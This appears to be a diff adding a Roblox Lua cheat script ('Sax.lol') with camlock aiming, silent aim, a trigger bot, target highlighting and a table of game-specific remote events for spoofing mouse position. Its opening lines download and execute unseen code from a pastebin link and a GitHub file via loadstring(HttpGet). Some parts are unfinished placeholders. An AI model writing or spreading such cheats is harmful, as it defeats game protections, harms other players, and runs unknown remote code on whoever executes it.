@@ -1,0 +1,320 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/eWaEP9qz", true))()
+
+wait(0.555)
+
+-- Load the custom library
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/maiy1993/UiLibraryForNoob/main/kpLzpNXc.txt", true))()
+
+local Window = Library:CreateWindow("Sax.lol | BETA", Vector2.new(400, 300), Enum.KeyCode.RightShift)
+
+-- Create Tabs
+local Tab1 = Window:CreateTab("Main")
+local Tab2 = Window:CreateTab("Settings")
+
+-- Variables
+local LocalPlayer = game.Players.LocalPlayer
+local CamlockState = false
+local TriggerBotEnabled = false
+local SilentAimEnabled = true
+local Smoothing = 0.65
+local JumpOffset = 0.09
+local FallOffset = 0
+local TriggerBotTolerance = 10
+
+-- Silent Aim Settings
+getgenv().HitPart = "HumanoidRootPart"
+getgenv().SilentPrediction = 0.155
+getgenv().Enabled = true
+getgenv().Resolver = true
+
+-- FOV settings
+getgenv().ShowFOV = true
+getgenv().Filled = false
+getgenv().FOVSize = 275
+getgenv().FOVTransparency = 0.1
+getgenv().FOVThickness = 0.1
+getgenv().FOVColor = Color3.new(1, 0, 0)
+
+local SilentAimFOVCircle = Drawing.new("Circle")
+SilentAimFOVCircle.Color = getgenv().FOVColor
+SilentAimFOVCircle.Visible = getgenv().ShowFOV
+SilentAimFOVCircle.Filled = getgenv().Filled
+SilentAimFOVCircle.Radius = getgenv().FOVSize
+SilentAimFOVCircle.Transparency = getgenv().FOVTransparency
+SilentAimFOVCircle.Thickness = getgenv().FOVThickness
+
+-- Function to update FOV Size
+local function updateFOVSize(value)
+    local newSize = tonumber(value)
+    if newSize then
+        getgenv().FOVSize = newSize
+        SilentAimFOVCircle.Radius = newSize
+        SendNotification("saxx.lol", "FOV Size set to " .. newSize)
+    else
+        SendNotification("saxx.lol", "Invalid FOV Size")
+    end
+end
+
+-- Function to find the nearest enemy
+local function FindNearestEnemy()
+    local closestDistance, closestPlayer = math.huge, nil
+    local centerPosition = Vector2.new(
+        game:GetService("GuiService"):GetScreenResolution().X / 2,
+        game:GetService("GuiService"):GetScreenResolution().Y / 2
+    )
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local character = player.Character
+            if character and character:FindFirstChild("HumanoidRootPart") and character.Humanoid.Health > 0 then
+                local position, isVisibleOnViewport = 
+                    game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(character.HumanoidRootPart.Position)
+
+                if isVisibleOnViewport then
+                    local distance = (centerPosition - Vector2.new(position.X, position.Y)).Magnitude
+                    if distance < closestDistance then
+                        closestPlayer = character
+                        closestDistance = distance
+                    end
+                end
+            end
+        end
+    end
+    return closestPlayer
+end
+
+-- Global variables to track highlight and wall check visibility
+getgenv().ShowHighlight = false
+getgenv().EnableWallCheck = true  -- Default to enable wall check
+
+-- Function to check if a player is dead
+local function isPlayerDead(player)
+    if player.Character and player.Character:FindFirstChild("BodyEffects") then
+        local bodyEffects = player.Character.BodyEffects
+        local ko = bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")
+        return ko and ko.Value
+    end
+    return false
+end
+
+-- Function to highlight a player
+local function highlightPlayer(player)
+    local char = player.Character
+    if char and not char:FindFirstChild("Highlight") then
+        local highlight = Instance.new("BillboardGui")
+        highlight.Name = "Highlight"
+        highlight.Parent = char
+        highlight.Size = UDim2.new(0, 10, 0, 10)  -- Fixed size
+        highlight.Adornee = char.HumanoidRootPart
+        highlight.AlwaysOnTop = true
+        highlight.StudsOffset = Vector3.new(0, 2, 0)  -- Offset to ensure visibility
+
+        local frameBackground = Instance.new("Frame")
+        frameBackground.Size = UDim2.new(1, 0, 1, 0)
+        frameBackground.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black outline
+        frameBackground.BackgroundTransparency = 0.5
+        frameBackground.Parent = highlight
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, -2, 1, -2)  -- Slightly smaller to fit inside the black outline
+        frame.Position = UDim2.new(0, 1, 0, 1)
+        frame.BackgroundColor3 = Color3.new(1, 0, 0)  -- Red color
+        frame.BackgroundTransparency = 0.5
+        frame.Parent = highlight
+    end
+end
+
+-- Function to remove all highlights
+local function removeAllHighlights()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("Highlight") then
+            player.Character.Highlight:Destroy()
+        end
+    end
+end
+
+-- Function to check if a ray to the player is obstructed
+local function isRayObstructed(player)
+    local playerRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+    if not playerRootPart then return true end
+
+    local rayOrigin = workspace.CurrentCamera.CFrame.p
+    local rayDirection = (playerRootPart.Position - rayOrigin).unit
+    local rayLength = (playerRootPart.Position - rayOrigin).magnitude
+    local ray = Ray.new(rayOrigin, rayDirection * rayLength)
+
+    local hit, hitPosition = workspace:FindPartOnRay(ray, LocalPlayer.Character)
+
+    return hit and not hit:IsDescendantOf(player.Character)
+end
+
+-- Function to get the closest player to the center of the screen, excluding players behind walls and dead players
+local function getClosestPlayerToCenter()
+    local centerScreenPosition = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+    local closestPlayer
+    local closestDistance = math.huge
+
+    -- Remove previous highlights if highlight is off
+    if not getgenv().ShowHighlight then
+        removeAllHighlights()
+    end
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not isPlayerDead(player) then
+            local playerRootPart = player.Character.HumanoidRootPart
+            local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(playerRootPart.Position)
+
+            -- Check if the player is on screen
+            if onScreen and (not getgenv().EnableWallCheck or not isRayObstructed(player)) then
+                local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude
+                if distance < closestDistance and distance <= SilentAimFOVCircle.Radius then
+                    closestPlayer = player
+                    closestDistance = distance
+                end
+            end
+        end
+    end
+
+    -- Highlight the closest player if highlight is on
+    if getgenv().ShowHighlight then
+        -- Remove previous highlights first
+        removeAllHighlights()
+        
+        if closestPlayer then
+            highlightPlayer(closestPlayer)
+        end
+    end
+
+    return closestPlayer
+end
+
+local SilentTarget = nil
+
+-- Update Silent Aim Target and FOV Circle Position
+game:GetService("RunService").RenderStepped:Connect(function()
+    SilentTarget = getClosestPlayerToCenter()
+    SilentAimFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+end)
+
+-- Game-specific RemoteEvents
+local game_support = {
+    [2788229376] = { Remote = "MainEvent", Argument = "UpdateMousePosI" },
+    [12238627497] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
+    [5602055394] = { Remote = "MAINEVENT", Argument = "MousePos" },
+    [17403265390] = { Remote = "MAINEVENT", Argument = "MOUSE" },
+    [17403166075] = { Remote = "MAINEVENT", Argument = "MOUSE" },
+    [18111448661] = { Remote = "MAINEVENT", Argument = "MOUSE" },
+    [15306593843] = { Remote = "MainEvent", Argument = "MousePos" },
+    [16703513780] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
+    [3183403065] = { Remote = "MainEvent", Argument = "UpdateMousePos" }
+}
+
+local function IsValidGame()
+    return game_support[game.PlaceId] ~= nil
+end
+
+local function GetRemote()
+    local gameData = game_support[game.PlaceId]
+    return game:GetService("ReplicatedStorage"):FindFirstChild(gameData.Remote), gameData.Argument
+end
+
+-- Function to check if the target is jumping
+local function isTargetJumping(target)
+    if target and target:FindFirstChild("HumanoidRootPart") then
+        return target.HumanoidRootPart.Velocity.Y > 2 -- Adjust this value based on jump height
+    end
+    return false
+end
+
+-- Main Loop
+local CamlockLoop = coroutine.create(function()
+    while true do
+        if CamlockState and SilentTarget then
+            local targetPosition = SilentTarget.HumanoidRootPart.Position + Vector3.new(0, JumpOffset, 0) + SilentTarget.HumanoidRootPart.Velocity * getgenv().SilentPrediction
+            local targetCFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, targetPosition)
+
+            -- Smoothly interpolate the camera's CFrame towards the targetCFrame
+            workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame:Lerp(targetCFrame, Smoothing)
+
+            -- Check if the target is jumping
+            if isTargetJumping(SilentTarget) then
+                -- Ensure the shooting tool is equipped and active
+                local shootingTool = LocalPlayer.Backpack:FindFirstChild("ShootingToolName") -- Replace with the actual tool name
+                if shootingTool then
+                    LocalPlayer.Character.Humanoid:EquipTool(shootingTool)
+                    shootingTool:Activate()
+                end
+            end
+        end
+        wait(0.01) -- Loop delay to reduce CPU usage
+    end
+end)
+
+coroutine.resume(CamlockLoop)
+
+-- UI Elements and Callbacks
+Tab1:CreateToggle("Camlock", CamlockState, function(value)
+    CamlockState = value
+    SendNotification("saxx.lol", "Camlock " .. (value and "enabled" or "disabled"))
+end)
+
+Tab1:CreateToggle("Silent Aim", SilentAimEnabled, function(value)
+    SilentAimEnabled = value
+    SendNotification("saxx.lol", "Silent Aim " .. (value and "enabled" or "disabled"))
+end)
+
+Tab1:CreateToggle("Trigger Bot", TriggerBotEnabled, function(value)
+    TriggerBotEnabled = value
+    SendNotification("saxx.lol", "Trigger Bot " .. (value and "enabled" or "disabled"))
+end)
+
+Tab1:CreateTextBox("Silent Prediction", getgenv().SilentPrediction, function(value)
+    local newPrediction = tonumber(value)
+    if newPrediction then
+        getgenv().SilentPrediction = newPrediction
+        SendNotification("saxx.lol", "Silent Prediction set to " .. newPrediction)
+    else
+        SendNotification("saxx.lol", "Invalid Silent Prediction")
+    end
+end)
+
+Tab1:CreateTextBox("Smoothness", Smoothing, function(value)
+    local newSmoothing = tonumber(value)
+    if newSmoothing then
+        Smoothing = newSmoothing
+        SendNotification("saxx.lol", "Smoothness set to " .. newSmoothing)
+    else
+        SendNotification("saxx.lol", "Invalid Smoothness")
+    end
+end)
+
+Tab1:CreateTextBox("FOV Size", getgenv().FOVSize, updateFOVSize)
+
+Tab1:CreateTextBox("Jump Offset", JumpOffset, function(value)
+    local newOffset = tonumber(value)
+    if newOffset then
+        JumpOffset = newOffset
+        SendNotification("saxx.lol", "Jump Offset set to " .. newOffset)
+    else
+        SendNotification("saxx.lol", "Invalid Jump Offset")
+    end
+end)
+
+Tab1:CreateToggle("Show Highlight", getgenv().ShowHighlight, function(value)
+    getgenv().ShowHighlight = value
+    SendNotification("saxx.lol", "Show Highlight " .. (value and "enabled" or "disabled"))
+end)
+
+Tab1:CreateToggle("Enable Wall Check", getgenv().EnableWallCheck, function(value)
+    getgenv().EnableWallCheck = value
+    SendNotification("saxx.lol", "Wall Check " .. (value and "enabled" or "disabled"))
+end)
+
+-- Function to send notifications
+function SendNotification(Title, Text)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = Title,
+        Text = Text,
+        Duration = 5
+    })
+end
